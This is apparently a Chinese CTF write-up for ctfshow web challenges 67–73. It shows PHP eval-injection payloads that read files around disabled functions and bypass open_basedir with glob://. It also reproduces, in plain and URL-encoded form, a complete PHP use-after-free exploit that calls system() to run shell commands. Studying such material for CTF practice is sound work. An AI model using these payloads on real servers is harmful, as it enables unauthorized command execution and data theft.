<img src="https://i-blog.csdnimg.cn/blog_migrate/bd00960d8888433ad06787b38c060317.png" alt="" style="max-height:119px; box-sizing:content-box;" />


发现print_r被禁用了

那我们还有一个var_dump

```lisp
c=var_dump(scandir('/'));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/3558ca52fd16663d9a0d40e161ea0538.png" alt="" style="max-height:185px; box-sizing:content-box;" />


读取即可

```cobol
c=highlight_file('/flag.txt');
```

## web68 highlight_file被禁用





<img src="https://i-blog.csdnimg.cn/blog_migrate/c929c823d86e36caa80303852689f4c8.png" alt="" style="max-height:181px; box-sizing:content-box;" />


一打开就是 报错

那我们就知道是 highlight_file 被禁止

我们继续看看

```lisp
c=var_dump(scandir('/'));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/5a81d242cf00b79022643dbb3a8f922f.png" alt="" style="max-height:261px; box-sizing:content-box;" />


那我们直接包含 flag.txt文件

```php
c=include('/flag.txt');
```

## web69  var_dump 被禁用



<img src="https://i-blog.csdnimg.cn/blog_migrate/b7329a9113ad8b566330d977fe442d16.png" alt="" style="max-height:201px; box-sizing:content-box;" />


那我们可以使用另一个

```lisp
c=var_export(scandir('/'));
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/99e452879c02dbf3cc5d2b5118a424ce.png" alt="" style="max-height:254px; box-sizing:content-box;" />


然后继续include访问

```php
c=include('/flag.txt');
```

## web70



<img src="https://i-blog.csdnimg.cn/blog_migrate/bffe5e7692f8a4e3229e1c116888bbc3.png" alt="" style="max-height:216px; box-sizing:content-box;" />


和上一题一样做法

```lisp
c=var_export(scandir('/'));
c=include('/flag.txt');
```

## web71  ob_end_clean 清零缓冲区  UAF命令执行

给了我们源代码

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
结果存入缓冲区
        ob_end_clean();
删除清楚缓冲区
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
如果 s存在 数字字母就用 ?代替
}else{
    highlight_file(__FILE__);
}
 
?>
 
你要上天吗？
```

这里主要是两个函数

```scss
ob_get_contents()
得到的值存入缓冲区
ob_end_clean()
将缓冲区清除
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/af9964e7afe39dcf5c15a0850a8eda0f.png" alt="" style="max-height:303px; box-sizing:content-box;" />


这里能发现第一次的输出 没有实现

而是输出了第二次的

那我们思考 我们能不能直接输入一个exit() 退出指令

让程序执行完我们的命令后直接退出

```php
c=include('/flag.txt');exit();
```

首先我们看看没有exit函数的情况



<img src="https://i-blog.csdnimg.cn/blog_migrate/f8dd0aae5da3a9fb59c45a83462d37ee.png" alt="" style="max-height:235px; box-sizing:content-box;" />






访问两个flag



<img src="https://i-blog.csdnimg.cn/blog_migrate/d2e7c8384aa3e6d476e7d0f537deaaec.png" alt="" style="max-height:69px; box-sizing:content-box;" />


发现会先读取 然后就进行缓冲区的删除 因为我没有送入缓冲区 所以没有显示



<img src="https://i-blog.csdnimg.cn/blog_migrate/4d2f7be2a0b72e2f1a6d5b07cc2a453c.png" alt="" style="max-height:124px; box-sizing:content-box;" />


发现 我们只要加了函数后 程序就退出了

所以执行完include后 执行exit 这样就退出了 就不会执行下面的函数了

这样我们这道题也做完了

```php
c=include('/flag.txt');exit();
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/e3964769aab9d2e2c10d1abcc56ca4a6.png" alt="" style="max-height:175px; box-sizing:content-box;" />


## web72  bypass open_basedir

```cobol
<?php
 
/*
# -*- coding: utf-8 -*-
# @Author: Lazzaro
# @Date:   2020-09-05 20:49:30
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-07 22:02:47
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
error_reporting(0);
ini_set('display_errors', 0);
// 你们在炫技吗？
if(isset($_POST['c'])){
        $c= $_POST['c'];
        eval($c);
        $s = ob_get_contents();
        ob_end_clean();
        echo preg_replace("/[0-9]|[a-z]/i","?",$s);
}else{
    highlight_file(__FILE__);
}
 
?>
 
你要上天吗？
```

这里遇到了open_basedr的限制

 [绕过 open_basedir_双层小牛堡的博客-CSDN博客](https://blog.csdn.net/m0_64180167/article/details/132140858?spm=1001.2014.3001.5501) 

学习完后来测试这个题目

通过 glob协议配合函数接口绕过 open_basedir 然后再绕过 缓冲区清零清理

```php
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/d244896bf6a9276c748b751d4cb32f74.png" alt="" style="max-height:170px; box-sizing:content-box;" />


绕过了 并且打印了 根目录的内容 那么我们 看看能不能访问



对于uaf 了解很少  应该是pwn的内容

```cobol
<?php
 
function ctfshow($cmd) {
    global $abc, $helper, $backtrace;
 
    class Vuln {
        public $a;
        public function __destruct() { 
            global $backtrace; 
            unset($this->a);
            $backtrace = (new Exception)->getTrace();
            if(!isset($backtrace[1]['args'])) {
                $backtrace = debug_backtrace();
            }
        }
    }
 
    class Helper {
        public $a, $b, $c, $d;
    }
 
    function str2ptr(&$str, $p = 0, $s = 8) {
        $address = 0;
        for($j = $s-1; $j >= 0; $j--) {
            $address <<= 8;
            $address |= ord($str[$p+$j]);
        }
        return $address;
    }
 
    function ptr2str($ptr, $m = 8) {
        $out = "";
        for ($i=0; $i < $m; $i++) {
            $out .= sprintf("%c",($ptr & 0xff));
            $ptr >>= 8;
        }
        return $out;
    }
 
    function write(&$str, $p, $v, $n = 8) {
        $i = 0;
        for($i = 0; $i < $n; $i++) {
            $str[$p + $i] = sprintf("%c",($v & 0xff));
            $v >>= 8;
        }
    }
 
    function leak($addr, $p = 0, $s = 8) {
        global $abc, $helper;
        write($abc, 0x68, $addr + $p - 0x10);
        $leak = strlen($helper->a);
        if($s != 8) { $leak %= 2 << ($s * 8) - 1; }
        return $leak;
    }
 
    function parse_elf($base) {
        $e_type = leak($base, 0x10, 2);
 
        $e_phoff = leak($base, 0x20);
        $e_phentsize = leak($base, 0x36, 2);
        $e_phnum = leak($base, 0x38, 2);
 
        for($i = 0; $i < $e_phnum; $i++) {
            $header = $base + $e_phoff + $i * $e_phentsize;
            $p_type  = leak($header, 0, 4);
            $p_flags = leak($header, 4, 4);
            $p_vaddr = leak($header, 0x10);
            $p_memsz = leak($header, 0x28);
 
            if($p_type == 1 && $p_flags == 6) { 
 
                $data_addr = $e_type == 2 ? $p_vaddr : $base + $p_vaddr;
                $data_size = $p_memsz;
            } else if($p_type == 1 && $p_flags == 5) { 
                $text_size = $p_memsz;
            }
        }
 
        if(!$data_addr || !$text_size || !$data_size)
            return false;
 
        return [$data_addr, $text_size, $data_size];
    }
 
    function get_basic_funcs($base, $elf) {
        list($data_addr, $text_size, $data_size) = $elf;
        for($i = 0; $i < $data_size / 8; $i++) {
            $leak = leak($data_addr, $i * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x746e6174736e6f63)
                    continue;
            } else continue;
 
            $leak = leak($data_addr, ($i + 4) * 8);
            if($leak - $base > 0 && $leak - $base < $data_addr - $base) {
                $deref = leak($leak);
                
                if($deref != 0x786568326e6962)
                    continue;
            } else continue;
 
            return $data_addr + $i * 8;
        }
    }
 
    function get_binary_base($binary_leak) {
        $base = 0;
        $start = $binary_leak & 0xfffffffffffff000;
        for($i = 0; $i < 0x1000; $i++) {
            $addr = $start - 0x1000 * $i;
            $leak = leak($addr, 0, 7);
            if($leak == 0x10102464c457f) {
                return $addr;
            }
        }
    }
 
    function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = leak($addr);
            $f_name = leak($f_entry, 0, 6);
 
            if($f_name == 0x6d6574737973) {
                return leak($addr + 8);
            }
            $addr += 0x20;
        } while($f_entry != 0);
        return false;
    }
 
    function trigger_uaf($arg) {
 
        $arg = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
        $vuln = new Vuln();
        $vuln->a = $arg;
    }
 
    if(stristr(PHP_OS, 'WIN')) {
        die('This PoC is for *nix systems only.');
    }
 
    $n_alloc = 10; 
    $contiguous = [];
    for($i = 0; $i < $n_alloc; $i++)
        $contiguous[] = str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA');
 
    trigger_uaf('x');
    $abc = $backtrace[1]['args'][0];
 
    $helper = new Helper;
    $helper->b = function ($x) { };
 
    if(strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }
 
    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;
 
    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
 
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);
 
    $closure_obj = str2ptr($abc, 0x20);
 
    $binary_leak = leak($closure_handlers, 8);
    if(!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }
 
    if(!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }
 
    if(!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }
 
    if(!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }
 
 
    $fake_obj_offset = 0xd0;
    for($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }
 
    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4); 
    write($abc, 0xd0 + 0x68, $zif_system); 
 
    ($helper->b)($cmd);
    exit();
}
 
ctfshow("cat /flag0.txt");ob_end_flush();
?>
```

通过url编码

payload

```cobol
c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B'args'%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20%24data_addr%20%2B%20%24i%20*%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_binary_base(%24binary_leak)%20%7B%0A%20%20%20%20%20%20%20%20%24base%20%3D%200%3B%0A%20%20%20%20%20%20%20%20%24start%20%3D%20%24binary_leak%20%26%200xfffffffffffff000%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x1000%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%3D%20%24start%20-%200x1000%20*%20%24i%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24addr%2C%200%2C%207)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20%3D%3D%200x10102464c457f)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20%24addr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_system(%24basic_funcs)%20%7B%0A%20%20%20%20%20%20%20%20%24addr%20%3D%20%24basic_funcs%3B%0A%20%20%20%20%20%20%20%20do%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_entry%20%3D%20leak(%24addr)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24f_name%20%3D%20leak(%24f_entry%2C%200%2C%206)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24f_name%20%3D%3D%200x6d6574737973)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20return%20leak(%24addr%20%2B%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%24addr%20%2B%3D%200x20%3B%0A%20%20%20%20%20%20%20%20%7D%20while(%24f_entry%20!%3D%200)%3B%0A%20%20%20%20%20%20%20%20return%20false%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20trigger_uaf(%24arg)%20%7B%0A%0A%20%20%20%20%20%20%20%20%24arg%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%20%20%20%20%20%20%20%20%24vuln%20%3D%20new%20Vuln()%3B%0A%20%20%20%20%20%20%20%20%24vuln-%3Ea%20%3D%20%24arg%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(stristr(PHP_OS%2C%20'WIN'))%20%7B%0A%20%20%20%20%20%20%20%20die('This%20PoC%20is%20for%20*nix%20systems%20only.')%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24n_alloc%20%3D%2010%3B%20%0A%20%20%20%20%24contiguous%20%3D%20%5B%5D%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n_alloc%3B%20%24i%2B%2B)%0A%20%20%20%20%20%20%20%20%24contiguous%5B%5D%20%3D%20str_shuffle('AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA')%3B%0A%0A%20%20%20%20trigger_uaf('x')%3B%0A%20%20%20%20%24abc%20%3D%20%24backtrace%5B1%5D%5B'args'%5D%5B0%5D%3B%0A%0A%20%20%20%20%24helper%20%3D%20new%20Helper%3B%0A%20%20%20%20%24helper-%3Eb%20%3D%20function%20(%24x)%20%7B%20%7D%3B%0A%0A%20%20%20%20if(strlen(%24abc)%20%3D%3D%2079%20%7C%7C%20strlen(%24abc)%20%3D%3D%200)%20%7B%0A%20%20%20%20%20%20%20%20die(%22UAF%20failed%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20%24closure_handlers%20%3D%20str2ptr(%24abc%2C%200)%3B%0A%20%20%20%20%24php_heap%20%3D%20str2ptr(%24abc%2C%200x58)%3B%0A%20%20%20%20%24abc_addr%20%3D%20%24php_heap%20-%200xc8%3B%0A%0A%20%20%20%20write(%24abc%2C%200x60%2C%202)%3B%0A%20%20%20%20write(%24abc%2C%200x70%2C%206)%3B%0A%0A%20%20%20%20write(%24abc%2C%200x10%2C%20%24abc_addr%20%2B%200x60)%3B%0A%20%20%20%20write(%24abc%2C%200x18%2C%200xa)%3B%0A%0A%20%20%20%20%24closure_obj%20%3D%20str2ptr(%24abc%2C%200x20)%3B%0A%0A%20%20%20%20%24binary_leak%20%3D%20leak(%24closure_handlers%2C%208)%3B%0A%20%20%20%20if(!(%24base%20%3D%20get_binary_base(%24binary_leak)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20determine%20binary%20base%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24elf%20%3D%20parse_elf(%24base)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20parse%20ELF%20header%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24basic_funcs%20%3D%20get_basic_funcs(%24base%2C%20%24elf)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20basic_functions%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20if(!(%24zif_system%20%3D%20get_system(%24basic_funcs)))%20%7B%0A%20%20%20%20%20%20%20%20die(%22Couldn't%20get%20zif_system%20address%22)%3B%0A%20%20%20%20%7D%0A%0A%0A%20%20%20%20%24fake_obj_offset%20%3D%200xd0%3B%0A%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%200x110%3B%20%24i%20%2B%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%20%24fake_obj_offset%20%2B%20%24i%2C%20leak(%24closure_obj%2C%20%24i))%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20write(%24abc%2C%200x20%2C%20%24abc_addr%20%2B%20%24fake_obj_offset)%3B%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x38%2C%201%2C%204)%3B%20%0A%20%20%20%20write(%24abc%2C%200xd0%20%2B%200x68%2C%20%24zif_system)%3B%20%0A%0A%20%20%20%20(%24helper-%3Eb)(%24cmd)%3B%0A%20%20%20%20exit()%3B%0A%7D%0A%0Actfshow(%22cat%20%2Fflag0.txt%22)%3Bob_end_flush()%3B%0A%3F%3E
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/18be3755dddd4cf049447184c69acd9b.png" alt="" style="max-height:178px; box-sizing:content-box;" />


## web73

继续用伪协议读取

```php
c=?><?php $a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString().' ');} exit(0);?>
```

发现相比 72修改了名字

看看读取

```cobol
c=function%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B'args'%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%